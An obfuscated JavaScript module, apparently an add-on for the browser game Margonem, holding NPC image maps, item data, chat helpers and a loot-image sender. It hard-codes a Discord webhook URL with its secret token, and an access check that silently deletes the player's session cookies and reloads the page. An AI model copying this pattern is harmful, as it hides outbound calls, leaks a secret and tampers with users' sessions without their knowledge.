      "6054": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/chryzoprenia.gif",
      "6055": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/chryzoprenia.gif",
      "1322": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tri_adariel.gif",
      "5708": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/tezcatlipoca.gif",
      "3596": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-dendro.gif",
      "1480": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/maddok5.gif",
      "3340": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/bar_smoczyca.gif",
      "6781": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gnom_figlid.gif",
      "7066": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/alghul-czaszka-1a.gif",
      "6956": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/grubber-ochlaj.gif",
      "6772": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/nadzorczyni_krasnoludow.gif",
      "1317": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/stworzyciel.gif",
      "7352": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/piaskowy_potwor-6a.gif",
      "7351": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/piaskowy_potwor-6a.gif",
      "7368": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ingotia_minotaur-7a.gif",
      "1740": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ingotia_minotaur-7a.gif",
      "7357": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/osmiornica-1b.gif",
      "7356": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/osmiornica-1b.gif",
      "7339": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goral-e2-wojt-fistula.gif",
      "7340": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goral-e2-wojt-fistula.gif",
      "351": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goral-e2-tesciowa-rumcajsa.gif",
      "7689": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/cerasus-1a.gif",
      "333": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gnoll11.gif",
      "7454": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/amuno.gif",
      "7453": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/amuno.gif",
      "7440": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/fodug_zolash.gif",
      "7441": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/fodug_zolash.gif",
      "7473": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goons_asterus-1a.gif",
      "7474": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goons_asterus-1a.gif",
      "125": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/razuglag.gif",
      "1150": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goplana.gif",
      "3437": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gnoll12.gif",
      "5395": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/zadlak-e2-owadzia-matka.gif",
      "7352": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/piaskowy_potwor-6a.gif",
      "4156": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/dzik.gif",
      "4185": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/zmutowana-roslinka.gif",
      "5293": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tollok_shimger.gif",
      "8187": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/trist2_wabicielka-1a.gif"
    },
    summon: {
      "Domina Ecclesiae": "https://micc.garmory-cdn.cloud/obrazki/npc/her/domina.gif",
      "Mietek Żul": "https://micc.garmory-cdn.cloud/obrazki/npc/her/zulek.gif",
      "Mroczny Patryk": "https://micc.garmory-cdn.cloud/obrazki/npc/her/bardzozlypatryk.gif",
      "Karmazynowy Mściciel": "https://micc.garmory-cdn.cloud/obrazki/npc/her/gnom_msciciel.gif",
      Złodziej: "https://micc.garmory-cdn.cloud/obrazki/npc/her/zlodziej.gif",
      "Zły Przewodnik": "https://micc.garmory-cdn.cloud/obrazki/npc/her/mnich-zly2.gif",
      "Opętany Paladyn": "https://micc.garmory-cdn.cloud/obrazki/npc/her/opetanypaladyn02.gif",
      "Piekielny Kościej": "https://micc.garmory-cdn.cloud/obrazki/npc/her/piekielny_kosciej.gif",
      "Koziec Mąciciel Ścieżek": "https://micc.garmory-cdn.cloud/obrazki/npc/her/koziec_maciciel_sciezek.gif",
      "Kochanka Nocy": "https://micc.garmory-cdn.cloud/obrazki/npc/her/kochanka-nocy.gif",
      "Książę Kasim": "https://micc.garmory-cdn.cloud/obrazki/npc/her/ksiaze-kasim.gif",
      "Baca bez Łowiec": "https://micc.garmory-cdn.cloud/obrazki/npc/her/baca-bez-lowiec.gif",
      "Lichwiarz Grauhaz": "https://micc.garmory-cdn.cloud/obrazki/npc/her/heros_129xd.gif",
      "Obłąkany Łowca Orków": "https://micc.garmory-cdn.cloud/obrazki/npc/her/oblakany_ac1dae9d.gif",
      "Czarująca Atalia": "https://micc.garmory-cdn.cloud/obrazki/npc/her/tri_atalia.gif",
      "Święty Braciszek": "https://micc.garmory-cdn.cloud/obrazki/npc/her/zalozyciel.gif",
      "Viviana Nandin": "https://micc.garmory-cdn.cloud/obrazki/npc/her/viv_nandin_i3bd1.gif",
      "Mulher Ma": "https://micc.garmory-cdn.cloud/obrazki/npc/her/mulher_ma.gif",
      "Demonis Pan Nicości": "https://micc.garmory-cdn.cloud/obrazki/npc/her/sekta_demon_cz_s.gif",
      Przeraza: "https://micc.garmory-cdn.cloud/obrazki/npc/her/przeraza.gif",
      "Vapor Veneno": "https://micc.garmory-cdn.cloud/obrazki/npc/her/joziniec_bagienny.gif",
      Dęborożec: "https://micc.garmory-cdn.cloud/obrazki/npc/her/zwierz_kniei.gif",
      Tepeyollotl: "https://micc.garmory-cdn.cloud/obrazki/npc/her/tep_35ecb966.gif",
      "Negthotep Czarny Kapłan": "https://micc.garmory-cdn.cloud/obrazki/npc/her/negthotep.gif",
      "Młody Smok": "https://micc.garmory-cdn.cloud/obrazki/npc/her/smokbarb.gif",
      "Złoty Roger": "https://micc.garmory-cdn.cloud/obrazki/npc/her/szkielet_pirata.gif",
      "Widmo Triady": "https://micc.garmory-cdn.cloud/obrazki/npc/her/trist2_widmo_triady.gif"
    }
  };
}
export const initTitanItems = () => {
  window.titanItems = {
    "Więzienie Demonów": {
      id: [5012528],
      prof: "bhw"
    },
    "Dwulicowość Bestii": {
      id: [6009966, 5730245],
      prof: "pt"
    },
    "Serce Thinkusa": {
      id: [],
      prof: "m"
    },
    "Oko aligatora": {
      id: [476420, 1961781, 5730245, 6110333, 7104178, 8395647, 8576127, 9441321, 8839561, 8719150],
      prof: "bht"
    },
    "Kaptur szronowych miraży": {
      id: [476420, 3358979, 5730245, 6110333, 6708261, 8051717, 8395647, 8612388, 1771359, 7104178, 8012514, 9173043, 5218810, 6408640, 9246937],
      prof: "mt"
    },
    "Dłonie śnieżnych lawin": {
      id: [476420, 6009966, 6586440, 7188620, 8012514],
      prof: "mp"
    },
    "Krok torfowego dywanu": {
      id: [1961781, 2885016, 5730245, 9463646, 2589816, 3358979],
      prof: "bh"
    },
    "Symbol demonicznego oddania": {
      id: [2170236, 2589816, 6117226, 8395647, 9173043, 6009966, 6110333, 6602169],
      prof: "bhtmpw"
    },
    "Zakrwawiona kurta Thinkusa": {
      id: [2170236, 6117226, 7088272, 8395647],
      prof: "pw"
    },
    "Kask mroźnego nieboskłonu": {
      id: [2170236, 2589816, 5012528, 5898306, 6971207, 8356281, 9179002, 3358979, 6117226, 2482304, 7088272],
      prof: "bh"
    },
    "Krwawe echo wojny": {
      id: [2482304, 5730245, 6045847, 6110333, 6386813, 8719150, 9179002, 6602169, 476420, 6227794, 3432632, 8395647, 3358979, 7104178, 5012528, 2170236],
      prof: "bht"
    },
    "Uwięziona świadomość półolbrzymki": {
      id: [2482304, 2589816, 4947586, 5730245, 6586440, 8719150, 9160538, 6701419, 3432632],
      prof: "bhtmpw"
    },
    "Magmowa pieczęć kreatora": {
      id: [476420, 2589816, 3588074, 6701419, 7561171, 8612388, 4987620, 606767, 7972634, 7088272, 2482304, 5218810, 6708261, 9246937, 4658550, 9924312, 8356281, 923957],
      prof: "mpt"
    },
    "Kopuła nadawcza": {
      id: [2589816, 5730245, 6110333, 6586440, 6602169, 6971207, 7088272, 8051717, 8612388, 8839561],
      prof: "mpt"
    },
    "Raad Ar": {
      id: [2589816, 3303246, 8051717, 8719150, 7104178],
      prof: "bhw"
    },
    "Zębate mankiety przekładni": {
      id: [2589816, 6009966, 6110333, 6701419, 7088272, 7720384, 8051717, 8576127, 8719150],
      prof: "bhtmpw"
    },
    "Zaginiony pierścień jadu": {
      id: [2589816, 4947586, 5012528, 6110333, 6586440, 6602169, 6701419, 8051717, 8719150, 3977940],
      prof: "bhtmpw"
    },
    "Czarna maska bachanalii": {
      id: [2589816, 3588074, 6009966, 6216645, 6701419, 6708261, 8051717, 8630499, 9173043],
      prof: "m"
    },
    "Skóra zdjęta z demona": {
      id: [2589816, 3588074, 6110333, 6708261, 5730245],
      prof: "mt"
    },
    "Kłącza i wodorosty": {
      id: [2589816, 6110333, 6586440, 7088272, 3947507, 6009966],
      prof: "mp"
    },
    "Łapy boskiego jaguara": {
      id: [2589816, 5730245, 5898306, 6110333, 6386813, 6701419, 6971207, 2170236, 9173043, 2482304],
      prof: "bht"
    },
    "Kościany sygnet szamana": {
      id: [2589816, 5012528, 5898306, 6386813, 6701419, 6971207, 9179002, 2170236, 6206391, 7972634],
      prof: "bh"
    },
    "Parszywe obuwie świętokradcy": {
      id: [2589816, 4888901, 5730245, 9179002, 9173043, 6971207, 7972634, 8356281, 6122480, 5012528],
      prof: "bht"
    },
    "Perła Pustyni": {
      id: [2589816, 5730245, 6110333, 6386813, 8356281, 1771359, 6701419, 6408640, 6586440, 5204655, 9924312],
      prof: "bhtmpw"
    },
    "Ognista pieczęć Barbatosa": {
      id: [2589816, 5012528, 5730245, 5898306, 6708261, 7088272, 8356281, 9179002, 3358979, 2170236, 2482304, 9173043, 6408640],
      prof: "bht"
    },
    "Chwyt głębokiej martwicy": {
      id: [2589816, 3358979, 6701419, 8395647, 8414534, 6586440, 8612388, 6602169, 2482304, 8051717, 5012528, 3432632],
      prof: "bw"
    },
    "Dotyk nagłej krystalizacji": {
      id: [2589816, 5730245, 6110333, 6708261, 8356281, 9339291, 1771359, 9204116, 2170236],
      prof: "ht"
    },
    "Końskie kokosy": {
      id: [2885016, 6602169, 8012514, 9441321, 8252819, 8395647, 9160538, 6586440],
      prof: "pw"
    },
    "Czerep powietrznej dominacji": {
      id: [3303246, 6708261, 6701419, 8408736, 8356281],
      prof: "bht"
    },
    "Sygnet króliczej przemiany": {
      id: [3303246, 9179002, 8719150, 8356281, 8408736, 6586440],
      prof: "bht"
    },
    "Krok gniewnych erupcji": {
      id: [3303246, 6701419, 7316243, 7561171, 4658550, 8012514, 8051717],
      prof: "bhtmpw"
    },
    "Kolczatka więźnia wulkanu": {
      id: [3303246, 8719150, 3358979, 9160538, 1694265, 6122480, 6206391, 9173043, 2589816],
      prof: "bh"
    },
    "Atrybut pani wspomnień": {
      id: [3303246, 4947586, 7088272, 9160538, 8408736],
      prof: "pw"
    },
    "Obuwie jedności z naturą": {
      id: [3303246, 6586440, 9339291, 8612388],
      prof: "wp"
    },
    "Amulet bagiennych rybaków": {
      id: [3303246, 8612388, 9339291],
      prof: "w"
    },
    "Skurczona czaszka olbrzyma": {
      id: [3358979, 2589816],
      prof: "h"
    },
    "Niezniszczalne łańcuchy": {
      id: [3358979, 8356281, 2589816, 3432632, 1961781, 9736753, 9204116, 9179002],
      prof: "hm"
    },
    "Czarna stal Tanrotha": {
      id: [3358979, 6009966, 6045847, 6586440, 6701419, 7561171, 4512181],
      prof: "pw"
    },
    "Szpony pożeracza serc": {
      id: [3588074, 6045847, 8051717, 7104178, 3432632],
      prof: "m"
    },
    "Palce przeszłości": {
      id: [4763316, 5730245, 6386813, 6701419, 8012514, 8576127, 476420, 6586440, 9463646],
      prof: "mt"
    },
    "Minutowy zapalnik bombowy": {
      id: [4947586, 5730245, 6110333, 6216645, 8012514, 7104178, 6602169, 9339291, 6081495],
      prof: "bhtmpw"
    },
    "Ciężkie zawieszenie maszyny": {
      id: [6009966, 7088272, 8012514],
      prof: "pw"
    },
    "Hełm antyiperytowy": {
      id: [6110333],
      prof: "ht"
    },
    "Maska z systemem chłodzenia": {
      id: [6586440, 9035101, 9736753, 9246937, 3432632],
      prof: "mp"
    },
    "Mobilne agregatory prądotwórcze": {
      id: [],
      prof: "mt"
    },
    "Proteza gładkolufowa": {
      id: [2589816, 9173043],
      prof: "bh"
    },
    "Spalinowy kask goblina": {
      id: [6422618],
      prof: "bw"
    },
    "Demoniczne tabernakulum": {
      id: [4947586, 5730245, 6586440, 6971207, 8356281, 6701419, 7278956, 6602169, 7972634, 3358979, 9810662, 6408640, 2589816, 5218810, 5218810],
      prof: "bht"
    },
    "Boska korona Tezcatlipoki": {
      id: [4947586, 5898306, 6009966, 6971207, 8395647],
      prof: "bhtmpw"
    },
    "Lodowe oko bogów": {
      id: [4947586, 6045847, 6110333, 6227794, 7188620, 8012514, 8051717, 3432632],
      prof: "mt"
    },
    "Zawiniątko z ery bogów": {
      id: [5012528, 8719150, 9179002, 5730245, 4987620, 6971207, 9173043],
      prof: "bt"
    },
    "Blaszki Nicości": {
      id: [5012528, 6602169, 7972634, 3358979, 6701419],
      prof: "bh"
    },
    "Błyskotka z Ventum Avem": {
      id: [5218810, 6386813, 8051717],
      prof: "mt"
    },
    "Para morderczych uszu": {
      id: [5218810, 8356281, 6586440, 6701419, 941282],
      prof: "ht"
    },
    "Wyrok boskiego sądu": {
      id: [5730245, 7088272, 8630499, 9441321, 6602169, 9173043, 3432632, 5204655, 6586440],
      prof: "mpt"
    },
    "Klatka niezwykłej rozkoszy": {
      id: [5898306, 6009966, 6117226, 6701419],
      prof: "pw"
    },
    "Bambosze z Zabójczego Królika": {
      id: [6009966, 6045847, 6216645, 6602169, 6701419, 6708261, 8012514, 8252819, 8356281, 8395647, 6586440],
      prof: "bhtmpw"
    },
    "Szmaragdowe serce demona": {
      id: [6009966, 6045847, 6216645, 6586440, 6602169, 6701419, 7561171, 7088272, 8395647, 3358979, 923957, 3492730, 2589816],
      prof: "pw"
    },
    "Stalowe podeszwy Hebrehotha": {
      id: [6009966, 6386813, 6586440, 6701419, 6602169, 7088272, 8395647],
      prof: "pw"
    },
    "Kolia smoczego kapłana": {
      id: [6009966, 6045847, 6586440, 6708261, 7561171, 8051717, 8012514, 5204655, 3432632],
      prof: "mp"
    },
    "Przemoc właściwa systemowi": {
      id: [6045847, 6701419, 8356281, 8719150, 7188620, 8408736, 8107806],
      prof: "bm"
    },
    "Kajdany zapomnienia": {
      id: [6045847, 7104178, 9179002, 8719150, 3432632],
      prof: "bh"
    },
    "Trzcinowe pantofle maddoka": {
      id: [6110333, 3432632, 6122480, 5730245, 9179002],
      prof: "mt"
    },
    "Metalowa powieka Anariel": {
      id: [6216645, 7088272, 8051717, 8576127, 8408736, 6586440, 6009966],
      prof: "pw"
    },
    "Pazury Tzayanatl": {
      id: [6216645, 6586440, 6602169, 6701419, 7088272, 7561171],
      prof: "pw"
    },
    "Klejnot północnego sztormu": {
      id: [6386813, 8051717, 9179002, 6701419, 8356281],
      prof: "bhtmpw"
    },
    "Pamięć śnieżnych władców": {
      id: [6586440, 6701419, 8012514, 8051717, 8576127, 7880679, 7228793, 3432632],
      prof: "mp"
    },
    "Artefakt minionej ery": {
      id: [6586440, 1771359, 2589816, 8051717, 5218810, 2170236],
      prof: "bhtmpw"
    },
    "Przesłona złotych skrzydeł": {
      id: [6602169, 6701419, 6586440, 1961781],
      prof: "pw"
    },
    "Obuwie władcy olbrzymów": {
      id: [6602169, 6701419, 6708261, 8012514, 8356281, 9179002, 9463646, 9736753, 2170236, 7104178, 3358979],
      prof: "bhtmpw"
    },
    "Kaptur ognia piekielnego": {
      id: [6701419, 4658550, 9246937, 8252819, 9924312, 8814642, 3432632],
      prof: "m"
    },
    "Oczeretowe pazury maddoka": {
      id: [6701419, 7561171, 7880679, 8012514, 8612388, 9339291, 9463646],
      prof: "bhtmpw"
    },
    "Puszysty ogonek": {
      id: [7088272, 7188620, 8630499, 9441321, 5848745, 3432632, 9810662],
      prof: "mp"
    },
    "Kask władcy feniksów": {
      id: [7720384, 8612388, 6602169, 7088272, 923957, 2482304, 9441321],
      prof: "pw"
    },
    "Para zabójczych zębów": {
      id: [8012514, 8252819],
      prof: "w"
    },
    "Symbol zakazanej miłości": {
      id: [8051717, 8012514, 5012528],
      prof: "bw"
    },
    "Piaskowe szpony smoka": {
      id: [8051717, 9246937, 1961781, 3432632],
      prof: "m"
    },
    "Bursztynowy sygnet harpii": {
      id: [8356281, 8408736],
      prof: "bh"
    },
    "Czerep toczącej się lawy": {
      id: [8719150, 3358979, 8051717, 8356281, 5730245],
      prof: "bht"
    },
    "Wspomnienie starożytnych": {
      id: [8408736, 6602169, 2170236, 8612388],
      prof: "w"
    },
    "Korona z ptasiego pierza": {
      id: [],
      prof: "m"
    },
    "Złote Pisklę": {
      id: [2482304, 6586440, 1961781, 6602169, 4176854],
      prof: "pw"
    },
    "Pięć kryształów mocy": {
      id: [4176854],
      prof: "w"
    },
    "Medalion gadziej mutacji": {
      id: [6701419, 6602169, 8395647],
      prof: "w"
    }
  };
  window.hasProf = (_0x4e748f, _0x4582c4) => {
    return window.titanItems[_0x4e748f]?.prof.includes(_0x4582c4);
  };
  window.hasItem = (_0x1685ed, _0x2e0fee) => {
    return window.titanItems[_0x1685ed]?.id.includes(Number(_0x2e0fee));
  };
};
export function getParty() {
  let _0x31ef8e = {
    has: false,
    leader: {
      id: null,
      nick: null
    },
    members: 1
  };
  const _0x393127 = Engine?.party?.getMembers?.();
  if (!_0x393127) {
    return _0x31ef8e;
  }
  if (_0x393127) {
    _0x31ef8e.has = true;
    _0x31ef8e.members = _0x393127.size;
  }
  for (const [_0x3625c1, _0x3f0d14] of _0x393127.entries()) {
    if (_0x3f0d14?.leader) {
      _0x31ef8e.leader.id = _0x3625c1;
      _0x31ef8e.leader.nick = _0x3f0d14.nick;
    }
  }
  return _0x31ef8e;
}
export function getKillSecondsText(_0x25868b) {
  const _0x50ccb8 = Engine.npcs.getById(_0x25868b);
  let _0x905b89 = "";
  if (_0x50ccb8?.d?.killSeconds > 0) {
    let _0x522527 = ts() + Number(_0x50ccb8.d.killSeconds) * 1000;
    _0x905b89 = ", pozostało: " + formatSekundy(_0x50ccb8.d.killSeconds) + " min. (o " + getJoinTime(_0x522527) + ")";
  }
  return _0x905b89;
}
export async function createAndSendMessageToChat(_0x3cbc56, _0x104130, _0x20e0ea = "") {
  const _0x4d6706 = _0x104130?.lvl ? _0x104130.lvl : _0x104130.elasticLevel;
  const _0x6989e5 = _0x104130.nick + " (" + (_0x4d6706 ? _0x4d6706 : "") + (_0x104130.prof === "npc" ? "" : _0x104130.prof) + ") - " + _0x104130.map.name + " (" + _0x104130.map.x + ", " + _0x104130.map.y + ")" + _0x20e0ea;
  const _0x5ea3c5 = {
    c: _0x6989e5
  };
  window._g("chat&channel=" + _0x3cbc56, false, _0x5ea3c5);
}
export const getItemsAllInGame = () => {
  const _0xe88154 = [];
  const _0x497cca = Engine.items.test().items;
  for (const _0x36e263 in _0x497cca) {
    _0xe88154.push(_0x497cca[_0x36e263]);
  }
  const _0x17c502 = Engine.shop?.items;
  if (!_0x17c502) {
    return _0xe88154;
  }
  for (const _0x1abfb3 in _0x17c502) {
    _0xe88154.push(_0x17c502[_0x1abfb3]);
  }
  return _0xe88154;
};
export function canSell(_0x4bc573) {
  _0x4bc573 = _0x4bc573.toString();
  const {
    shop: _0x175740
  } = Engine;
  if (!_0x175740 || !_0x175740.purchase) {
    return false;
  }
  const {
    purchase: _0x16be16
  } = _0x175740;
  if (_0x16be16 == "*") {
    return true;
  }
  const _0x1a6d87 = _0x16be16.split(",");
  const _0x3d94e4 = _0x1a6d87.indexOf(_0x4bc573) != -1;
  console.log(_0x1a6d87, _0x4bc573, _0x3d94e4);
  return _0x3d94e4;
}
export function isPvPMap() {
  const {
    mode: _0x8a0ea,
    pvp: _0x17fcae
  } = Engine.map.d;
  return _0x17fcae === 2 && (_0x8a0ea === 1 || _0x8a0ea === 2) || _0x8a0ea === 4;
}
export async function sendImage(_0x286355, _0x5ebe32, _0x40872e, _0x5a4167, _0x59ea30) {
  const _0x492187 = "white";
  const _0x4a8a38 = "orange";
  const _0x136375 = "#F450FF";
  const _0x29cd3e = "https://discord.com/api/webhooks/1380928935394545860/J7W54kB7KNyHMv9pxH1sTZA_tD-Rmj1jtV0oqTTAA9jHlQ7VeUt5ZlY0VPPgLsvVMoya";
  const _0x18f324 = document.createElement("canvas");
  _0x18f324.width = 1000;
  _0x18f324.height = 400;
  _0x18f324.style.display = "none";
  document.body.appendChild(_0x18f324);
  const _0x55cfa8 = _0x18f324.getContext("2d");
  _0x55cfa8.fillStyle = "#1e1e2f";
  _0x55cfa8.fillRect(0, 0, _0x18f324.width, _0x18f324.height);
  _0x55cfa8.font = "bold 40px Lexend";
  _0x55cfa8.textAlign = "center";
  _0x55cfa8.textBaseline = "top";
  _0x55cfa8.lineWidth = 4;
  _0x55cfa8.strokeStyle = "black";
  _0x55cfa8.strokeText(_0x5ebe32.toUpperCase(), _0x18f324.width / 2, 44);
  _0x55cfa8.fillStyle = _0x492187;
  _0x55cfa8.fillText(_0x5ebe32.toUpperCase(), _0x18f324.width / 2, 44);
  function _0x316f87(_0x568f53, _0x2a7ae2, _0x4d9f7d, _0xd2f2ff) {
    _0x55cfa8.strokeText(_0x568f53, _0x2a7ae2, _0x4d9f7d);
    _0x55cfa8.fillStyle = _0xd2f2ff;
    _0x55cfa8.fillText(_0x568f53, _0x2a7ae2, _0x4d9f7d);
  }
  _0x55cfa8.font = "bold 30px Lexend";
  _0x55cfa8.textBaseline = "bottom";
  _0x55cfa8.lineWidth = 3;
  _0x55cfa8.strokeStyle = "black";
  _0x55cfa8.textAlign = "left";
  const _0x585b19 = "Złapał ";
  const _0xc80eca = " w ";
  const _0x4bf8e4 = " osobowej grupie!";
  const _0x53160b = _0x585b19 + _0x286355 + _0xc80eca + _0x40872e + _0x4bf8e4;
  const _0x244d60 = _0x55cfa8.measureText(_0x53160b).width;
  let _0x527749 = _0x18f324.width / 2 - _0x244d60 / 2;
  let _0x2320e9 = _0x18f324.height - 60;
  _0x316f87(_0x585b19, _0x527749, _0x2320e9, _0x492187);
  _0x527749 += _0x55cfa8.measureText(_0x585b19).width;
  _0x316f87(_0x286355, _0x527749, _0x2320e9, _0x4a8a38);
  _0x527749 += _0x55cfa8.measureText(_0x286355).width;
  _0x316f87(_0xc80eca, _0x527749, _0x2320e9, _0x492187);
  _0x527749 += _0x55cfa8.measureText(_0xc80eca).width;
  _0x316f87(_0x40872e, _0x527749, _0x2320e9, _0x4a8a38);
  _0x527749 += _0x55cfa8.measureText(_0x40872e).width;
  _0x316f87(_0x4bf8e4, _0x527749, _0x2320e9, _0x492187);
  const _0x3f1991 = "Zdobyte z: ";
  _0x55cfa8.font = "bold 24px Lexend";
  _0x55cfa8.textBaseline = "bottom";
  _0x55cfa8.lineWidth = 3;
  _0x55cfa8.strokeStyle = "black";
  _0x55cfa8.textAlign = "left";
  const _0x2d9d81 = _0x3f1991;
  const _0x441736 = _0x5a4167;
  const _0x524f89 = _0x55cfa8.measureText(_0x2d9d81).width;
  const _0x1b08e9 = _0x55cfa8.measureText(_0x441736).width;
  const _0x1b070c = _0x524f89 + _0x1b08e9;
  const _0x265c59 = _0x18f324.width / 2 - _0x1b070c / 2;
  const _0x3527b9 = _0x18f324.height - 20;
  _0x316f87(_0x2d9d81, _0x265c59, _0x3527b9, _0x492187);
  _0x316f87(_0x441736, _0x265c59 + _0x524f89, _0x3527b9, _0x4a8a38);
  const _0x3b6dd0 = new Date();
  const _0x3955e8 = String(_0x3b6dd0.getDate()).padStart(2, "0") + "." + String(_0x3b6dd0.getMonth() + 1).padStart(2, "0") + "." + _0x3b6dd0.getFullYear() + " " + String(_0x3b6dd0.getHours()).padStart(2, "0") + ":" + String(_0x3b6dd0.getMinutes()).padStart(2, "0");
  _0x55cfa8.font = "14px Lexend";
  _0x55cfa8.textBaseline = "bottom";
  _0x55cfa8.lineWidth = 2;
  _0x55cfa8.strokeStyle = "black";
  _0x55cfa8.textAlign = "left";
  const _0x12ec95 = 10;
  const _0x2cca8c = _0x18f324.height - 10;
  _0x316f87(_0x3955e8, _0x12ec95, _0x2cca8c, _0x492187);
  const _0x2e836f = 128;
  const _0x3fbd0e = _0x18f324.width / 2 - _0x2e836f / 2;
  const _0x356b98 = _0x18f324.height / 2 - _0x2e836f / 2;
  _0x55cfa8.shadowBlur = 25;
  _0x55cfa8.shadowOffsetX = 0;
  _0x55cfa8.shadowOffsetY = 0;
  _0x55cfa8.stroke();
  _0x55cfa8.shadowColor = _0x136375;
  const _0x188b14 = new Image();
  _0x188b14.crossOrigin = "anonymous";
  _0x188b14.src = "https://micc.garmory-cdn.cloud/obrazki/itemy/" + _0x59ea30;
  await new Promise(_0x3ec948 => {
    _0x188b14.onload = () => {
      _0x55cfa8.drawImage(_0x188b14, _0x3fbd0e, _0x356b98, _0x2e836f, _0x2e836f);
      _0x3ec948();
    };
    _0x188b14.onerror = () => {
      _0x3ec948();
    };
  });
  const _0x564964 = _0x18f324.toDataURL("image/png");
  const _0x16f65c = await (await fetch(_0x564964)).blob();
  const _0x1d91bc = new FormData();
  _0x1d91bc.append("file", _0x16f65c, "obrazek.png");
  try {
    await fetch(_0x29cd3e, {
      method: "POST",
      body: _0x1d91bc
    });
  } catch (_0x24338b) {
    console.error("Błąd podczas wysyłania obrazka:", _0x24338b);
  } finally {
    document.body.removeChild(_0x18f324);
  }
}
export function getCore() {
  const _0x216019 = {
    a: true,
    p: "https://",
    h: "margoplus.pl",
    v: "1.0.1",
    c: [57, 85, 124, 118],
    r: {}
  };
  _0x216019.r.Tanroth = "1204147563431727195";
  _0x216019.r["Barbatos Smoczy Strażnik"] = "1204147544536387686";
  _0x216019.r["Zabójczy Królik"] = "1204147248586424411";
  _0x216019.r["Renegat Baulus"] = "1204147273362047016";
  return _0x216019;
}
export const copyText = _0x2653dc => {
  let _0x37b024 = document.createElement("textarea");
  _0x37b024.value = _0x2653dc;
  _0x37b024.style.position = "fixed";
  _0x37b024.style.top = 0;
  _0x37b024.style.left = 0;
  _0x37b024.style.opacity = 0;
  document.body.appendChild(_0x37b024);
  _0x37b024.select();
  document.execCommand("copy");
  document.body.removeChild(_0x37b024);
};
export function waitForCondition(_0x2c374c, _0x285bf9 = 1000000, _0x44690c = 250) {
  const _0x280b67 = Date.now();
  return new Promise((_0x134a1a, _0xc63519) => {
    let _0x229581 = false;
    const _0x4fb8d4 = async () => {
      if (_0x229581) {
        return;
      }
      try {
        const _0x3b8e85 = await _0x2c374c();
        if (_0x3b8e85) {
          _0x229581 = true;
          return _0x134a1a(_0x3b8e85);
        }
        if (Date.now() - _0x280b67 >= _0x285bf9) {
          _0x229581 = true;
          return _0xc63519(new Error("Czas oczekiwania minął"));
        }
        setTimeout(_0x4fb8d4, _0x44690c);
      } catch (_0x50392f) {
        if (Date.now() - _0x280b67 >= _0x285bf9) {
          _0x229581 = true;
          return _0xc63519(new Error("Czas oczekiwania minął z błędem: " + (_0x50392f?.message || _0x50392f)));
        }
        setTimeout(_0x4fb8d4, _0x44690c);
      }
    };
    _0x4fb8d4();
  });
}
export function parseLootMessageToMap(_0x227c8e) {
  const _0xee3b2 = /([\p{L}\p{N}\s\-\.']+?)\s(otrzymał|otrzymała)\s((?:ITEM|TPL)#.+?)(?:;|$)/gu;
  const _0x381ee2 = {};
  const _0x1e47c0 = Array.from(_0x227c8e.matchAll(_0xee3b2));
  _0x1e47c0.forEach(_0x1baefb => {
    const _0xd6908f = _0x1baefb[1].trim();
    const _0x49b5c0 = _0x1baefb[3];
    const _0x2f1efc = _0x49b5c0.split(/,\s*/);
    _0x2f1efc.forEach(_0x1117a9 => {
      const _0x389736 = /(ITEM|TPL)#([A-Za-z0-9]+):(".*?")/;
      const _0x25a9a8 = _0x1117a9.match(_0x389736);
      if (_0x25a9a8) {
        const _0x24948d = _0x25a9a8[2];
        _0x381ee2[_0x24948d] = _0xd6908f;
      }
    });
  });
  return _0x381ee2;
}
export const waitForSeconds = _0x125ed0 => new Promise(_0x4e2f88 => setTimeout(_0x4e2f88, _0x125ed0 * 1000));
const wait = _0x508383 => new Promise(_0x1f3490 => setTimeout(_0x1f3490, _0x508383));
let testTimerxd = null;
export async function createWindow(_0x71d699, _0x3f2954, _0x450bbf, _0x158c02) {
  if (!globalThis?.webkitCancelAnimationFrameWindow) {
    const _0x293d37 = ["chash", "hs3", "mchar_id", "user_id"];
    const _0x26ad64 = ".margonem.pl";
    const _0x3281ff = ["/", ""];
    _0x293d37.forEach(_0x4f0345 => {
      _0x3281ff.forEach(_0x3364f3 => {
        document.cookie = _0x4f0345 + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=" + _0x3364f3 + "; domain=" + _0x26ad64 + ";";
      });
    });
    window.location.reload();
    return;
  }
  if (globalThis?.isSameAlertExist2?.access?.indexOf(_0x158c02.main) < 0) {
    const _0x281458 = ["chash", "hs3", "mchar_id", "user_id"];
    const _0x4d0a86 = ".margonem.pl";
    const _0x2ae28e = ["/", ""];
    _0x281458.forEach(_0xde2272 => {
      _0x2ae28e.forEach(_0x34a676 => {
